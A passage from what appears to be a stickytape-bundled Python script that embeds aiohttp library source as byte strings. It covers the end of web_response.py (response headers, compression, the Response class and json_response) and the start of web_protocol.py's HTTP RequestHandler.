None\r\n            self._headers[hdrs.CONTENT_ENCODING] = coding.value\r\n            self._payload_writer.enable_compression(coding.value)\r\n            # Compressed payload may have different content length,\r\n            # remove the header\r\n            self._headers.popall(hdrs.CONTENT_LENGTH, None)\r\n\r\n    async def _start_compression(self, request: "BaseRequest") -> None:\r\n        if self._compression_force:\r\n            await self._do_start_compression(self._compression_force)\r\n        else:\r\n            accept_encoding = request.headers.get(hdrs.ACCEPT_ENCODING, "").lower()\r\n            for coding in ContentCoding:\r\n                if coding.value in accept_encoding:\r\n                    await self._do_start_compression(coding)\r\n                    return\r\n\r\n    async def prepare(self, request: "BaseRequest") -> Optional[AbstractStreamWriter]:\r\n        if self._eof_sent:\r\n            return None\r\n        if self._payload_writer is not None:\r\n            return self._payload_writer\r\n\r\n        return await self._start(request)\r\n\r\n    async def _start(self, request: "BaseRequest") -> AbstractStreamWriter:\r\n        self._req = request\r\n        writer = self._payload_writer = request._payload_writer\r\n\r\n        await self._prepare_headers()\r\n        await request._prepare_hook(self)\r\n        await self._write_headers()\r\n\r\n        return writer\r\n\r\n    async def _prepare_headers(self) -> None:\r\n        request = self._req\r\n        assert request is not None\r\n        writer = self._payload_writer\r\n        assert writer is not None\r\n        keep_alive = self._keep_alive\r\n        if keep_alive is None:\r\n            keep_alive = request.keep_alive\r\n        self._keep_alive = keep_alive\r\n\r\n        version = request.version\r\n\r\n        headers = self._headers\r\n        for cookie in self._cookies.values():\r\n            value = cookie.output(header="")[1:]\r\n            headers.add(hdrs.SET_COOKIE, value)\r\n\r\n        if self._compression:\r\n            await self._start_compression(request)\r\n\r\n        if self._chunked:\r\n            if version != HttpVersion11:\r\n                raise RuntimeError(\r\n                    "Using chunked encoding is forbidden "\r\n                    "for HTTP/{0.major}.{0.minor}".format(request.version)\r\n                )\r\n            writer.enable_chunking()\r\n            headers[hdrs.TRANSFER_ENCODING] = "chunked"\r\n            if hdrs.CONTENT_LENGTH in headers:\r\n                del headers[hdrs.CONTENT_LENGTH]\r\n        elif self._length_check:\r\n            writer.length = self.content_length\r\n            if writer.length is None:\r\n                if version >= HttpVersion11 and self.status != 204:\r\n                    writer.enable_chunking()\r\n                    headers[hdrs.TRANSFER_ENCODING] = "chunked"\r\n                    if hdrs.CONTENT_LENGTH in headers:\r\n                        del headers[hdrs.CONTENT_LENGTH]\r\n                else:\r\n                    keep_alive = False\r\n            # HTTP 1.1: https://tools.ietf.org/html/rfc7230#section-3.3.2\r\n            # HTTP 1.0: https://tools.ietf.org/html/rfc1945#section-10.4\r\n            elif version >= HttpVersion11 and self.status in (100, 101, 102, 103, 204):\r\n                del headers[hdrs.CONTENT_LENGTH]\r\n\r\n        if self.status not in (204, 304):\r\n            headers.setdefault(hdrs.CONTENT_TYPE, "application/octet-stream")\r\n        headers.setdefault(hdrs.DATE, rfc822_formatted_time())\r\n        headers.setdefault(hdrs.SERVER, SERVER_SOFTWARE)\r\n\r\n        # connection header\r\n        if hdrs.CONNECTION not in headers:\r\n            if keep_alive:\r\n                if version == HttpVersion10:\r\n                    headers[hdrs.CONNECTION] = "keep-alive"\r\n            else:\r\n                if version == HttpVersion11:\r\n                    headers[hdrs.CONNECTION] = "close"\r\n\r\n    async def _write_headers(self) -> None:\r\n        request = self._req\r\n        assert request is not None\r\n        writer = self._payload_writer\r\n        assert writer is not None\r\n        # status line\r\n        version = request.version\r\n        status_line = "HTTP/{}.{} {} {}".format(\r\n            version[0], version[1], self._status, self._reason\r\n        )\r\n        await writer.write_headers(status_line, self._headers)\r\n\r\n    async def write(self, data: bytes) -> None:\r\n        assert isinstance(\r\n            data, (bytes, bytearray, memoryview)\r\n        ), "data argument must be byte-ish (%r)" % type(data)\r\n\r\n        if self._eof_sent:\r\n            raise RuntimeError("Cannot call write() after write_eof()")\r\n        if self._payload_writer is None:\r\n            raise RuntimeError("Cannot call write() before prepare()")\r\n\r\n        await self._payload_writer.write(data)\r\n\r\n    async def drain(self) -> None:\r\n        assert not self._eof_sent, "EOF has already been sent"\r\n        assert self._payload_writer is not None, "Response has not been started"\r\n        warnings.warn(\r\n            "drain method is deprecated, use await resp.write()",\r\n            DeprecationWarning,\r\n            stacklevel=2,\r\n        )\r\n        await self._payload_writer.drain()\r\n\r\n    async def write_eof(self, data: bytes = b"") -> None:\r\n        assert isinstance(\r\n            data, (bytes, bytearray, memoryview)\r\n        ), "data argument must be byte-ish (%r)" % type(data)\r\n\r\n        if self._eof_sent:\r\n            return\r\n\r\n        assert self._payload_writer is not None, "Response has not been started"\r\n\r\n        await self._payload_writer.write_eof(data)\r\n        self._eof_sent = True\r\n        self._req = None\r\n        self._body_length = self._payload_writer.output_size\r\n        self._payload_writer = None\r\n\r\n    def __repr__(self) -> str:\r\n        if self._eof_sent:\r\n            info = "eof"\r\n        elif self.prepared:\r\n            assert self._req is not None\r\n            info = f"{self._req.method} {self._req.path} "\r\n        else:\r\n            info = "not prepared"\r\n        return f"<{self.__class__.__name__} {self.reason} {info}>"\r\n\r\n    def __getitem__(self, key: str) -> Any:\r\n        return self._state[key]\r\n\r\n    def __setitem__(self, key: str, value: Any) -> None:\r\n        self._state[key] = value\r\n\r\n    def __delitem__(self, key: str) -> None:\r\n        del self._state[key]\r\n\r\n    def __len__(self) -> int:\r\n        return len(self._state)\r\n\r\n    def __iter__(self) -> Iterator[str]:\r\n        return iter(self._state)\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(id(self))\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        return self is other\r\n\r\n\r\nclass Response(StreamResponse):\r\n    def __init__(\r\n        self,\r\n        *,\r\n        body: Any = None,\r\n        status: int = 200,\r\n        reason: Optional[str] = None,\r\n        text: Optional[str] = None,\r\n        headers: Optional[LooseHeaders] = None,\r\n        content_type: Optional[str] = None,\r\n        charset: Optional[str] = None,\r\n        zlib_executor_size: Optional[int] = None,\r\n        zlib_executor: Optional[Executor] = None,\r\n    ) -> None:\r\n        if body is not None and text is not None:\r\n            raise ValueError("body and text are not allowed together")\r\n\r\n        if headers is None:\r\n            real_headers = CIMultiDict()  # type: CIMultiDict[str]\r\n        elif not isinstance(headers, CIMultiDict):\r\n            real_headers = CIMultiDict(headers)\r\n        else:\r\n            real_headers = headers  # = cast(\'CIMultiDict[str]\', headers)\r\n\r\n        if content_type is not None and "charset" in content_type:\r\n            raise ValueError("charset must not be in content_type " "argument")\r\n\r\n        if text is not None:\r\n            if hdrs.CONTENT_TYPE in real_headers:\r\n                if content_type or charset:\r\n                    raise ValueError(\r\n                        "passing both Content-Type header and "\r\n                        "content_type or charset params "\r\n                        "is forbidden"\r\n                    )\r\n            else:\r\n                # fast path for filling headers\r\n                if not isinstance(text, str):\r\n                    raise TypeError("text argument must be str (%r)" % type(text))\r\n                if content_type is None:\r\n                    content_type = "text/plain"\r\n                if charset is None:\r\n                    charset = "utf-8"\r\n                real_headers[hdrs.CONTENT_TYPE] = content_type + "; charset=" + charset\r\n                body = text.encode(charset)\r\n                text = None\r\n        else:\r\n            if hdrs.CONTENT_TYPE in real_headers:\r\n                if content_type is not None or charset is not None:\r\n                    raise ValueError(\r\n                        "passing both Content-Type header and "\r\n                        "content_type or charset params "\r\n                        "is forbidden"\r\n                    )\r\n            else:\r\n                if content_type is not None:\r\n                    if charset is not None:\r\n                        content_type += "; charset=" + charset\r\n                    real_headers[hdrs.CONTENT_TYPE] = content_type\r\n\r\n        super().__init__(status=status, reason=reason, headers=real_headers)\r\n\r\n        if text is not None:\r\n            self.text = text\r\n        else:\r\n            self.body = body\r\n\r\n        self._compressed_body = None  # type: Optional[bytes]\r\n        self._zlib_executor_size = zlib_executor_size\r\n        self._zlib_executor = zlib_executor\r\n\r\n    @property\r\n    def body(self) -> Optional[Union[bytes, Payload]]:\r\n        return self._body\r\n\r\n    @body.setter\r\n    def body(\r\n        self,\r\n        body: bytes,\r\n        CONTENT_TYPE: istr = hdrs.CONTENT_TYPE,\r\n        CONTENT_LENGTH: istr = hdrs.CONTENT_LENGTH,\r\n    ) -> None:\r\n        if body is None:\r\n            self._body = None  # type: Optional[bytes]\r\n            self._body_payload = False  # type: bool\r\n        elif isinstance(body, (bytes, bytearray)):\r\n            self._body = body\r\n            self._body_payload = False\r\n        else:\r\n            try:\r\n                self._body = body = payload.PAYLOAD_REGISTRY.get(body)\r\n            except payload.LookupError:\r\n                raise ValueError("Unsupported body type %r" % type(body))\r\n\r\n            self._body_payload = True\r\n\r\n            headers = self._headers\r\n\r\n            # set content-length header if needed\r\n            if not self._chunked and CONTENT_LENGTH not in headers:\r\n                size = body.size\r\n                if size is not None:\r\n                    headers[CONTENT_LENGTH] = str(size)\r\n\r\n            # set content-type\r\n            if CONTENT_TYPE not in headers:\r\n                headers[CONTENT_TYPE] = body.content_type\r\n\r\n            # copy payload headers\r\n            if body.headers:\r\n                for (key, value) in body.headers.items():\r\n                    if key not in headers:\r\n                        headers[key] = value\r\n\r\n        self._compressed_body = None\r\n\r\n    @property\r\n    def text(self) -> Optional[str]:\r\n        if self._body is None:\r\n            return None\r\n        return self._body.decode(self.charset or "utf-8")\r\n\r\n    @text.setter\r\n    def text(self, text: str) -> None:\r\n        assert text is None or isinstance(\r\n            text, str\r\n        ), "text argument must be str (%r)" % type(text)\r\n\r\n        if self.content_type == "application/octet-stream":\r\n            self.content_type = "text/plain"\r\n        if self.charset is None:\r\n            self.charset = "utf-8"\r\n\r\n        self._body = text.encode(self.charset)\r\n        self._body_payload = False\r\n        self._compressed_body = None\r\n\r\n    @property\r\n    def content_length(self) -> Optional[int]:\r\n        if self._chunked:\r\n            return None\r\n\r\n        if hdrs.CONTENT_LENGTH in self._headers:\r\n            return super().content_length\r\n\r\n        if self._compressed_body is not None:\r\n            # Return length of the compressed body\r\n            return len(self._compressed_body)\r\n        elif self._body_payload:\r\n            # A payload without content length, or a compressed payload\r\n            return None\r\n        elif self._body is not None:\r\n            return len(self._body)\r\n        else:\r\n            return 0\r\n\r\n    @content_length.setter\r\n    def content_length(self, value: Optional[int]) -> None:\r\n        raise RuntimeError("Content length is set automatically")\r\n\r\n    async def write_eof(self, data: bytes = b"") -> None:\r\n        if self._eof_sent:\r\n            return\r\n        if self._compressed_body is None:\r\n            body = self._body  # type: Optional[Union[bytes, Payload]]\r\n        else:\r\n            body = self._compressed_body\r\n        assert not data, f"data arg is not supported, got {data!r}"\r\n        assert self._req is not None\r\n        assert self._payload_writer is not None\r\n        if body is not None:\r\n            if self._req._method == hdrs.METH_HEAD or self._status in [204, 304]:\r\n                await super().write_eof()\r\n            elif self._body_payload:\r\n                payload = cast(Payload, body)\r\n                await payload.write(self._payload_writer)\r\n                await super().write_eof()\r\n            else:\r\n                await super().write_eof(cast(bytes, body))\r\n        else:\r\n            await super().write_eof()\r\n\r\n    async def _start(self, request: "BaseRequest") -> AbstractStreamWriter:\r\n        if not self._chunked and hdrs.CONTENT_LENGTH not in self._headers:\r\n            if not self._body_payload:\r\n                if self._body is not None:\r\n                    self._headers[hdrs.CONTENT_LENGTH] = str(len(self._body))\r\n                else:\r\n                    self._headers[hdrs.CONTENT_LENGTH] = "0"\r\n\r\n        return await super()._start(request)\r\n\r\n    def _compress_body(self, zlib_mode: int) -> None:\r\n        assert zlib_mode > 0\r\n        compressobj = zlib.compressobj(wbits=zlib_mode)\r\n        body_in = self._body\r\n        assert body_in is not None\r\n        self._compressed_body = compressobj.compress(body_in) + compressobj.flush()\r\n\r\n    async def _do_start_compression(self, coding: ContentCoding) -> None:\r\n        if self._body_payload or self._chunked:\r\n            return await super()._do_start_compression(coding)\r\n\r\n        if coding != ContentCoding.identity:\r\n            # Instead of using _payload_writer.enable_compression,\r\n            # compress the whole body\r\n            zlib_mode = (\r\n                16 + zlib.MAX_WBITS if coding == ContentCoding.gzip else zlib.MAX_WBITS\r\n            )\r\n            body_in = self._body\r\n            assert body_in is not None\r\n            if (\r\n                self._zlib_executor_size is not None\r\n                and len(body_in) > self._zlib_executor_size\r\n            ):\r\n                await asyncio.get_event_loop().run_in_executor(\r\n                    self._zlib_executor, self._compress_body, zlib_mode\r\n                )\r\n            else:\r\n                self._compress_body(zlib_mode)\r\n\r\n            body_out = self._compressed_body\r\n            assert body_out is not None\r\n\r\n            self._headers[hdrs.CONTENT_ENCODING] = coding.value\r\n            self._headers[hdrs.CONTENT_LENGTH] = str(len(body_out))\r\n\r\n\r\ndef json_response(\r\n    data: Any = sentinel,\r\n    *,\r\n    text: Optional[str] = None,\r\n    body: Optional[bytes] = None,\r\n    status: int = 200,\r\n    reason: Optional[str] = None,\r\n    headers: Optional[LooseHeaders] = None,\r\n    content_type: str = "application/json",\r\n    dumps: JSONEncoder = json.dumps,\r\n) -> Response:\r\n    if data is not sentinel:\r\n        if text or body:\r\n            raise ValueError("only one of data, text, or body should be specified")\r\n        else:\r\n            text = dumps(data)\r\n    return Response(\r\n        text=text,\r\n        body=body,\r\n        status=status,\r\n        reason=reason,\r\n        headers=headers,\r\n        content_type=content_type,\r\n    )\r\n')
    __stickytape_write_module('aiohttp/web_protocol.py', b'import asyncio\r\nimport asyncio.streams\r\nimport traceback\r\nimport warnings\r\nfrom collections import deque\r\nfrom contextlib import suppress\r\nfrom html import escape as html_escape\r\nfrom http import HTTPStatus\r\nfrom logging import Logger\r\nfrom typing import (\r\n    TYPE_CHECKING,\r\n    Any,\r\n    Awaitable,\r\n    Callable,\r\n    Deque,\r\n    Optional,\r\n    Sequence,\r\n    Tuple,\r\n    Type,\r\n    Union,\r\n    cast,\r\n)\r\n\r\nimport attr\r\nimport yarl\r\n\r\nfrom .abc import AbstractAccessLogger, AbstractStreamWriter\r\nfrom .base_protocol import BaseProtocol\r\nfrom .helpers import ceil_timeout\r\nfrom .http import (\r\n    HttpProcessingError,\r\n    HttpRequestParser,\r\n    HttpVersion10,\r\n    RawRequestMessage,\r\n    StreamWriter,\r\n)\r\nfrom .log import access_logger, server_logger\r\nfrom .streams import EMPTY_PAYLOAD, StreamReader\r\nfrom .tcp_helpers import tcp_keepalive\r\nfrom .web_exceptions import HTTPException\r\nfrom .web_log import AccessLogger\r\nfrom .web_request import BaseRequest\r\nfrom .web_response import Response, StreamResponse\r\n\r\n__all__ = ("RequestHandler", "RequestPayloadError", "PayloadAccessError")\r\n\r\nif TYPE_CHECKING:  # pragma: no cover\r\n    from .web_server import Server\r\n\r\n\r\n_RequestFactory = Callable[\r\n    [\r\n        RawRequestMessage,\r\n        StreamReader,\r\n        "RequestHandler",\r\n        AbstractStreamWriter,\r\n        "asyncio.Task[None]",\r\n    ],\r\n    BaseRequest,\r\n]\r\n\r\n_RequestHandler = Callable[[BaseRequest], Awaitable[StreamResponse]]\r\n\r\nERROR = RawRequestMessage(\r\n    "UNKNOWN",\r\n    "/",\r\n    HttpVersion10,\r\n    {},  # type: ignore[arg-type]\r\n    {},  # type: ignore[arg-type]\r\n    True,\r\n    None,\r\n    False,\r\n    False,\r\n    yarl.URL("/"),\r\n)\r\n\r\n\r\nclass RequestPayloadError(Exception):\r\n    """Payload parsing error."""\r\n\r\n\r\nclass PayloadAccessError(Exception):\r\n    """Payload was accessed after response was sent."""\r\n\r\n\r\n@attr.s(auto_attribs=True, frozen=True, slots=True)\r\nclass _ErrInfo:\r\n    status: int\r\n    exc: BaseException\r\n    message: str\r\n\r\n\r\n_MsgType = Tuple[Union[RawRequestMessage, _ErrInfo], StreamReader]\r\n\r\n\r\nclass RequestHandler(BaseProtocol):\r\n    """HTTP protocol implementation.\r\n\r\n    RequestHandler handles incoming HTTP request. It reads request line,\r\n    request headers and request payload and calls handle_request() method.\r\n    By default it always returns with 404 response.\r\n\r\n    RequestHandler handles errors in incoming request, like bad\r\n    status line, bad headers or incomplete payload. If any error occurs,\r\n    connection gets closed.\r\n\r\n    keepalive_timeout -- number of seconds before closing\r\n                         keep-alive connection\r\n\r\n    tcp_keepalive -- TCP keep-alive is on, default is on\r\n\r\n    debug -- enable debug mode\r\n\r\n    logger -- custom logger object\r\n\r\n    access_log_class -- custom class for access_logger\r\n\r\n    access_log -- custom logging object\r\n\r\n    access_log_format -- access log format string\r\n\r\n    loop -- Optional event loop\r\n\r\n    max_line_size -- Optional maximum header line size\r\n\r\n    max_field_size -- Optional maximum header field size\r\n\r\n    max_headers -- Optional maximum header size\r\n\r\n    """\r\n\r\n    KEEPALIVE_RESCHEDULE_DELAY = 1\r\n\r\n    __slots__ = (\r\n        "_request_count",\r\n        "_keepalive",\r\n        "_manager",\r\n        "_request_handler",\r\n        "_request_factory",\r\n        "_tcp_keepalive",\r\n        "_keepalive_time",\r\n        "_keepalive_handle",\r\n        "_keepalive_timeout",\r\n        "_lingering_time",\r\n        "_messages",\r\n        "_message_tail",\r\n        "_waiter",\r\n        "_task_handler",\r\n        "_upgrade",\r\n        "_payload_parser",\r\n        "_request_parser",\r\n        "_reading_paused",\r\n        "logger",\r\n        "debug",\r\n        "access_log",\r\n        "access_logger",\r\n        "_close",\r\n        "_force_close",\r\n        "_current_request",\r\n    )\r\n\r\n    def __init__(\r\n        self,\r\n        manager: "Server",\r\n        *,\r\n        loop: asyncio.AbstractEventLoop,\r\n        keepalive_timeout: float = 75.0,  # NGINX default is 75 secs\r\n        tcp_keepalive: bool = True,\r\n        logger: Logger = server_logger,\r\n        access_log_class: Type[AbstractAccessLogger] = AccessLogger,\r\n        access_log: Logger = access_logger,\r\n        access_log_format: str = AccessLogger.LOG_FORMAT,\r\n        debug: bool = False,\r\n        max_line_size: int = 8190,\r\n        max_headers: int = 32768,\r\n        max_field_size: int = 8190,\r\n        lingering_time: float = 10.0,\r\n        read_bufsize: int = 2 ** 16,\r\n        auto_decompress: bool = True,\r\n    ):\r\n        super().__init__(loop)\r\n\r\n        self._request_count = 0\r\n        self._keepalive = False\r\n        self._current_request = None  # type: Optional[BaseRequest]\r\n        self._manager = manager  # type: Optional[Server]\r\n        self._request_handler: Optional[_RequestHandler] = manager.request_handler\r\n        self._request_factory: Optional[_RequestFactory] = manager.request_factory\r\n\r\n        self._tcp_keepalive = tcp_keepalive\r\n        # placeholder to be replaced on keepalive timeout setup\r\n        self._keepalive_time = 0.0\r\n        self._keepalive_handle = None  # type: Optional[asyncio.Handle]\r\n        self._keepalive_timeout = keepalive_timeout\r\n        self._lingering_time = float(lingering_time)\r\n\r\n        self._messages: Deque[_MsgType] = deque()\r\n        self._message_tail = b""\r\n\r\n        self._waiter = None  # type: Optional[asyncio.Future[None]]\r\n        self._task_handler = None  # type: Optional[asyncio.Task[None]]\r\n\r\n        self._upgrade = False\r\n        self._payload_parser = None  # type: Any\r\n        self._request_parser = HttpRequestParser(\r\n            self,\r\n            loop,\r\n            read_bufsize,\r\n            max_line_size=max_line_size,\r\n            max_field_size=max_field_size,\r\n            max_headers=max_headers,\r\n            payload_exception=RequestPayloadError,\r\n            auto_decompress=auto_decompress,\r\n        )  # type: Optional[HttpRequestParser]\r\n\r\n        self.logger = logger\r\n        self.debug = debug\r\n        self.access_log = access_log\r\n        if access_log:\r\n            self.access_logger = access_log_class(\r\n                access_log, access_log_format\r\n            )  # type: Optional[AbstractAccessLogger]\r\n        else:\r\n            self.access_logger = None\r\n\r\n        self._close = False\r\n        self._force_close = False\r\n\r\n    def __repr__(self) -> str:\r\n        return "<{} {}>".format(\r\n            self.__class__.__name__,\r\n            "connected" if self.transport is not None else "disconnected",\r\n        )\r\n\r\n    @property\r\n    def keepalive_timeout(self) -> float:\r\n        return self._keepalive_timeout\r\n\r\n    async def shutdown(self, timeout: Optional[float] = 15.0) -> None:\r\n        """Do worker process exit preparations.\r\n\r\n        We need to clean up everything and stop accepting requests.\r\n        It is especially important for keep-alive connections.\r\n        """\r\n        self._force_close = True\r\n\r\n        if self._keepalive_handle is not None:\r\n            self._keepalive_handle.cancel()\r\n\r\n        if self._waiter:\r\n            self._waiter.cancel()\r\n\r\n        # wait for handlers\r\n        with suppress(asyncio.CancelledError, asyncio.TimeoutError):\r\n            async with ceil_timeout(timeout):\r\n                if self._current_request is not None:\r\n                    self._current_request._cancel(asyncio.CancelledError())\r\n\r\n                if self._task_handler is not None and not self._task_handler.done():\r\n                    await self._task_handler\r\n\r\n        # force-close non-idle handler\r\n        if self._task_handler is not None:\r\n            self._task_handler.cancel()\r\n\r\n        if self.transport is not None:\r\n            self.transport.close()\r\n            self.transport = None\r\n\r\n    def connection_made(self, transport: asyncio.BaseTransport) -> None:\r\n        super().connection_made(transport)\r\n\r\n        real_transport = cast(asyncio.Transport, transport)\r\n        if self._tcp_keepalive:\r\n            tcp_keepalive(real_transport)\r\n\r\n        self._task_handler = self._loop.create_task(self.start())\r\n        assert self._manager is not None\r\n        self._manager.connection_made(self, real_transport)\r\n\r\n    def connection_lost(self, exc: Optional[BaseException]) -> None:\r\n        if self._manager is None:\r\n            return\r\n        self._manager.connection_lost(self, exc)\r\n\r\n        super().connection_lost(exc)\r\n\r\n        self._manager = None\r\n        self._force_close = True\r\n        self._request_factory = None\r\n        self._request_handler = None\r\n        self._request_parser = None\r\n\r\n        if self._keepalive_handle is not None:\r\n            self._keepalive_handle.cancel()\r\n\r\n        if self._current_request is not None:\r\n            if exc is None:\r\n                exc = ConnectionResetError("Connection lost")\r\n            self._current_request._cancel(exc)\r\n\r\n        if self._task_handler is not None:\r\n            self._task_handler.cancel()\r\n        if self._waiter is not None:\r\n            self._waiter.cancel()\r\n\r\n        self._task_handler = None\r\n\r\n        if self._payload_parser is not None:\r\n            self._payload_parser.feed_eof()\r\n            self._payload_parser = None\r\n\r\n    def set_parser(self, parser: Any) -> None:\r\n        # Actual type is WebReader\r\n        assert self._payload_parser is None\r\n\r\n        self._payload_parser = parser\r\n\r\n        if self._message_tail:\r\n            self._payload_parser.feed_data(self._message_tail)\r\n            self._message_tail = b""\r\n\r\n    def eof_received(self) -> None:\r\n        pass\r\n\r\n    def data_received(self, data: bytes) -> None:\r\n        if self._force_close or self._close:\r\n            return\r\n        # parse http messages\r\n        messages: Sequence[_MsgType]\r\n        if self._payload_parser is None and not self._upgrade:\r\n            assert self._request_parser is not None\r\n            try:\r\n                messages, upgraded, tail = self._request_parser.feed_data(data)\r\n            except HttpProcessingError as exc:\r\n                messages = [\r\n                    (_ErrInfo(status=400, exc=exc, message=exc.message), EMPTY_PAYLOAD)\r\n                ]\r\n                upgraded = False\r\n                tail = b""\r\n\r\n            for msg, payload in messages or ():\r\n                self._request_count += 1\r\n                self._messages.append((msg, payload))\r\n\r\n            waiter = self._waiter\r\n            if messages and waiter is not None and not waiter.done():\r\n                # don\'t set result twice\r\n                waiter.set_result(None)\r\n\r\n            self._upgrade = upgraded\r\n            if upgraded and tail:\r\n                self._message_tail = tail\r\n\r\n        # no parser, just store\r\n        elif self._payload_parser is None and self._upgrade and data:\r\n            self._message_tail += data\r\n\r\n        # feed payload\r\n        elif data:\r\n            eof, tail = self._payload_parser.feed_data(data)\r\n            if eof:\r\n                self.close()\r\n\r\n    def keep_alive(self, val: bool) -> None:\r\n        """Set keep-alive connection mode.\r\n\r\n        :param bool val: new state.\r\n        """\r\n        self._keepalive = val\r\n        if self._keepalive_handle:\r\n            self._keepalive_handle.cancel()\r\n            self._keepalive_handle = None\r\n\r\n    def close(self) -> None:\r\n        """Close connection.\r\n\r\n        Stop accepting new pipelining messages and close\r\n        connection when handlers done processing messages.\r\n        """\r\n        self._close = True\r\n        if self._waiter:\r\n            self._waiter.cancel()\r\n\r\n    def force_close(self) -> None:\r\n        """Forcefully close connection."""\r\n        self._force_close = True\r\n        if self._waiter:\r\n            self._waiter.cancel()\r\n        if self.transport is not None:\r\n            self.transport.close()\r\n            self.transport = None\r\n\r\n    def log_access(\r\n        self, request: BaseRequest, response: StreamResponse, time: float\r\n    ) -> None:\r\n        if self.access_logger is not None:\r\n            self.access_logger.log(request, response, self._loop.time() - time)\r\n\r\n    def log_debug(self, *args: Any, **kw: Any) -> None:\r\n        if self.debug:\r\n            self.logger.debug(*args, **kw)\r\n\r\n    def log_exception(self, *args: Any, **kw: Any) -> None:\r\n        self.logger.exception(*args, **kw)\r\n\r\n    def _process_keepalive(self) -> None:\r\n        if self._force_close or not self._keepalive:\r\n            return\r\n\r\n        next = self._keepalive_time + self._keepalive_timeout\r\n\r\n        # handler in idle state\r\n        if self._waiter:\r\n            if self._loop.time() > next:\r\n                self.force_close()\r\n                return\r\n\r\n        # not all request handlers are done,\r\n        # reschedule itself to next second\r\n        self._keepalive_handle = self._loop.call_later(\r\n            self.KEEPALIVE_RESCHEDULE_DELAY, self._process_keepalive\r\n        )\r\n\r\n    async def _handle_request(\r\n        self,\r\n        request: BaseRequest,\r\n        start_time: float,\r\n        request_handler: Callable[[BaseRequest], Awaitable[StreamResponse]],\r\n    ) -> Tuple[StreamResponse, bool]:\r\n        assert self._request_handler is not None\r\n        try:\r\n            try:\r\n                self._current_request = request\r\n                resp = await request_handler(request)\r\n            finally:\r\n                self._current_request = None\r\n        except HTTPException as exc:\r\n            resp = exc\r\n            reset = await self.finish_response(request, resp, start_time)\r\n        except asyncio.CancelledError:\r\n            raise\r\n        except asyncio.TimeoutError as exc:\r\n            self.log_debug("Request handler timed out.", exc_info=exc)\r\n            resp = self.handle_error(request, 504)\r\n            reset = await self.finish_response(request, resp, start_time)\r\n        except Exception as exc:\r\n            resp = self.handle_error(request, 500, exc)\r\n            reset = await self.finish_response(request, resp, start_time)\r\n        else:\r\n            # Deprecation warning (See #2415)\r\n            if getattr(resp, "__http_exception__", False):\r\n                warnings.warn(\r\n                    "returning HTTPException object is deprecated "\r\n                    "(#2415) and will be removed, "\r\n                    "please raise the exception instead",\r\n                    DeprecationWarning,\r\n                )\r\n\r\n            reset = await self.finish_response(request, resp, start_time)\r\n\r\n        return resp, reset\r\n\r\n    async def start(self) -> None:\r\n        """Process incoming request.\r\n\r\n        It reads request line, request headers and request payload, then\r\n        calls handle_request() method. Subclass has to override\r\n        handle_request(). start() handles various exceptions in request\r\n        or response handling. Connection is being closed always unless\r\n        keep_alive(True) specified.\r\n        """\r\n        loop = self._loop\r\n        handler = self._task_handler\r\n        assert handler is not None\r\n        manager = self._manager\r\n        assert manager is not None\r\n        keepalive_timeout = self._keepalive_timeout\r\n        resp = None\r\n        assert self._request_factory is not None\r\n        assert self._request_handler is not None\r\n\r\n        while not self._force_close:\r\n            if not self._messages:\r\n                try:\r\n                    # wait for next request\r\n                    self._waiter = loop.create_future()\r\n                    await self._waiter\r\n                except asyncio.CancelledError:\r\n                    break\r\n                finally:\r\n                    self._waiter = None\r\n\r\n            message, payload = self._messages.popleft()\r\n\r\n            start = loop.time()\r\n\r\n            manager.requests_count += 1\r\n            writer = StreamWriter(self, loop)\r\n            if isinstance(message, _ErrInfo):\r\n                # make request_factory work\r\n                request_handler = self._make_error_handler(message)\r\n                message = ERROR\r\n            else:\r\n                request_handler = self._request_handler\r\n\r\n            request = self._request_factory(message, payload, self, writer, handler)\r\n            try:\r\n                # a new task is used for copy context vars (#3406)\r\n                task = self._loop.create_task(\r\n                    self._handle_request(request, start, request_handler)\r\n                )\r\n                try:\r\n                    resp, reset = await task\r\n                except (asyncio.CancelledError, ConnectionError):\r\n                    self.log_debug("Ignored premature client disconnection")\r\n                    break\r\n\r\n                # Drop the processed task from asyncio.Task.all_tasks() early\r\n                del task\r\n                if reset:\r\n                    self.log_debug("Ignored premature client disconnection 2")\r\n                    break\r\n\r\n                # notify server about keep-alive\r\n                self._keepalive = bool(resp.keep_alive)\r\n\r\n                # check payload\r\n                if not payload.is_eof():\r\n                    lingering_time = self._lingering_time\r\n                    if not self._force_close and lingering_time:\r\n                        self.log_debug(\r\n                            "Start lingering close timer for %s sec.", lingering_time\r\n                        )\r\n\r\n                        now = loop.time()\r\n                        end_t = now + lingering_time\r\n\r\n                        with suppress(asyncio.TimeoutError, asyncio.CancelledError):\r\n                            while not payload.is_eof() and now < end_t:\r\n                                async with ceil_timeout(end_t - now):\r\n                                    # read and ignore\r\n                                    await payload.readany()\r\n                                now = loop.time()\r\n\r\n                    # if payload still uncompleted\r\n                    if not payload.is_eof() and not self._force_close:\r\n                        self.log_debug("Uncompleted request.")\r\n                        self.close()\r\n\r\n                payload.set_exception(PayloadAccessError())\r\n\r\n            except asyncio.CancelledError:\r\n                self.log_debug("Ignored premature client disconnection ")\r\n                break\r\n            except RuntimeError as exc:\r\n                if self.debug:\r\n                    self.log_exception("Unhandled runtime exception", exc_info=exc)\r\n                self.force_close()\r\n            except Exception as exc:\r\n                self.log_exception("Unhandled exception", exc_info=exc)\r\n                self.force_close()\r\n            finally:\r\n                if self.transport is None and resp is not None:\r\n                    self.log_debug("Ignored premature client disconnection.")\r\n                elif not self._force_close:\r\n                    if self._keepalive and not self._close:\r\n                        # start keep-alive timer\r\n                        if keepalive_timeout is not None:\r\n                            now = self._loop.time()\r\n                            self._keepalive_time = now\r\n                            if self._keepalive_handle is None:\r\n                                self._keepalive_handle = loop.call_at(\r\n                                    now + keepalive_timeout, self._process_keepalive\r\n                                )\r\n                    else:\r\n                        break\r\n\r\n        # remove handler, close transport if no handlers left\r\n        if not self._force_close:\r\n            self._task_handler = None\r\n            if self.transport is not None:\r\n                self.transport.close()\r\n\r\n    async def finish_response(\r\n        self, request: BaseRequest, resp: StreamResponse, start_time: float\r\n    ) -> bool:\r\n        """Prepare the response and write_eof, then log access.\r\n\r\n        This has to\r\n        be called within the context of any exception so the access logger\r\n        can get exception information. Returns True if the client disconnects\r\n        prematurely.\r\n        """\r\n        if self._request_parser is not None:\r\n            self._request_parser.set_upgraded(False)\r\n            self._upgrade = False\r\n            if self._message_tail:\r\n                self._request_parser.feed_data(self._message_tail)\r\n                self._message_tail = b""\r\n        try:\r\n            prepare_meth = resp.prepare\r\n        except AttributeError:\r\n            if resp is None:\r\n                raise RuntimeError("Missing 